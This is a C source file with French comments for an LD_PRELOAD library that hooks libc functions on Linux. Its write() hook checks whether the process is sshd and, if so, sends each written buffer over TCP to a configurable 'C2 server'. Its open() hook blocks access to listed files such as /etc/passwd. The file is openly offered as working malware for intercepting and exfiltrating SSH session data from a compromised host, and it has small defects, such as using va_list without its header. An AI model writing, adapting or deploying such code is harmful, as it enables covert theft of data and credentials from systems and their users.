#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Adresse IP et port du serveur C2
#define C2_IP "192.168.1.100"  // Remplacez par l'adresse IP de votre serveur C2
#define C2_PORT 12345

// Liste des fichiers bloqués
const char *blocked_files[] = {"/etc/passwd", "/chemin/interdit", NULL};

// Fonction pour envoyer les données au C2
void send_to_c2(const char *data) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) return;

    struct sockaddr_in server_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(C2_PORT),
    };
    inet_pton(AF_INET, C2_IP, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
        send(sock, data, strlen(data), 0);
    }
    close(sock);
}

// Vérification si un fichier est bloqué
int is_blocked(const char *file_path) {
    if (file_path == NULL) return 0;
    for (int i = 0; blocked_files[i] != NULL; i++) {
        if (strcmp(file_path, blocked_files[i]) == 0) return 1;
    }
    return 0;
}

// Interception de write
ssize_t write(int fd, const void *buf, size_t count) {
    ssize_t (*original_write)(int, const void *, size_t) = dlsym(RTLD_NEXT, "write");

    char proc_path[1024];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/comm", getpid());
    FILE *proc_file = fopen(proc_path, "r");
    if (proc_file) {
        char process_name[1024];
        fscanf(proc_file, "%s", process_name);
        fclose(proc_file);

        if (strcmp(process_name, "sshd") == 0) {
            char data[1024];
            snprintf(data, sizeof(data), "Intercepted (%zu bytes): %.*s\n", count, (int)count, (const char *)buf);
            send_to_c2(data);
        }
    }
    return original_write(fd, buf, count);
}

// Interception de open
int open(const char *pathname, int flags, ...) {
    int (*original_open)(const char *, int, ...) = dlsym(RTLD_NEXT, "open");

    if (is_blocked(pathname)) {
        fprintf(stderr, "Accès interdit au fichier : %s\n", pathname);
        return -1; // Empêche l'accès
    }

    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);

    return original_open(pathname, flags, mode);
}
